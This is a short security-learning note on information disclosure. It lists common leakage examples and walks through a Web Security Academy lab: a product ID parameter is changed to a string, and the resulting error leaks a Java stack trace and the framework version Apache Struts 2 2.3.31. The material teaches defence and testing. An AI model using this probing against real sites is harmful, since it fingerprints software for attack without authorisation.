# Information Disclosure
Information disclosure, also known as information leakage, is when a website unintentionally reveals sensitive information to its users.

## Examples of Information Disclosure
  - Revealing the names of hidden directories, their structure, and their contents via a robots.txt file or directory listing
  - Providing access to source code files via temporary backups
  - Explicitly mentioning database table or column names in error messages
  - Unnecessarily exposing highly sensitive information, such as credit card details
  - Hard-coding API keys, IP addresses, database credentials, and so on in the source code
  - Hinting at the existence or absence of resources, usernames, and so on via subtle differences in application behavior

### Error Messages
- Testing URL query parameters for information disclosure.
- Modify the data type of the query parameter value from an integer to a string value.
- Version information disclosed in server response.

**Original Request**
```HTTP
GET /product?productId=1 HTTP/1.1
Host: 0a23001803408c45805f80c10041009a.web-security-academy.net
Cookie: session=9uTYTHDdqFqCe9H1u9mwziP4MnrUsE2n
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a23001803408c45805f80c10041009a.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

**Modified Request**
```HTTP
GET /product?productId=TEST HTTP/2
Host: 0a23001803408c45805f80c10041009a.web-security-academy.net
Cookie: session=9uTYTHDdqFqCe9H1u9mwziP4MnrUsE2n
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a23001803408c45805f80c10041009a.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

**Server Response**
```CSS
HTTP/2 500 Internal Server Error
Content-Length: 1677

Internal Server Error: java.lang.NumberFormatException: For input string: "TEST"
	at java.base/java.lang.NumberFormatException.forInputString(NumberFormatException.java:67)
	at java.base/java.lang.Integer.parseInt(Integer.java:668)
	at java.base/java.lang.Integer.parseInt(Integer.java:786)
	at lab.v.k.v.g.B(Unknown Source)
	at lab.s.n.n.l.q(Unknown Source)
	at lab.s.n.c.x.z.u(Unknown Source)
	at lab.s.n.c.t.lambda$handleSubRequest$0(Unknown Source)
	at x.d.f.k.lambda$null$3(Unknown Source)
	at x.d.f.k.j(Unknown Source)
	at x.d.f.k.lambda$uncheckedFunction$4(Unknown Source)
	at java.base/java.util.Optional.map(Optional.java:260)
	at lab.s.n.c.t.w(Unknown Source)
	at lab.server.o.z.p.Q(Unknown Source)
	at lab.s.n.t.y(Unknown Source)
	at lab.s.n.t.Q(Unknown Source)
	at lab.server.o.z.u.r.z(Unknown Source)
	at lab.server.o.z.u.s.lambda$handle$0(Unknown Source)
	at lab.v.y.n.d.u(Unknown Source)
	at lab.server.o.z.u.s.V(Unknown Source)
	at lab.server.o.z.c.a(Unknown Source)
	at x.d.f.k.lambda$null$3(Unknown Source)
	at x.d.f.k.j(Unknown Source)
	at x.d.f.k.lambda$uncheckedFunction$4(Unknown Source)
	at lab.server.w.U(Unknown Source)
	at lab.server.o.z.c.O(Unknown Source)
	at lab.server.o.o.r.f(Unknown Source)
	at lab.server.o.k.g(Unknown Source)
	at lab.server.o.w.g(Unknown Source)
	at lab.server.s2.J(Unknown Source)
	at lab.server.s2.Z(Unknown Source)
	at lab.q.i.lambda$consume$0(Unknown Source)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1136)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:635)
	at java.base/java.lang.Thread.run(Thread.java:833)

Apache Struts 2 2.3.31
```
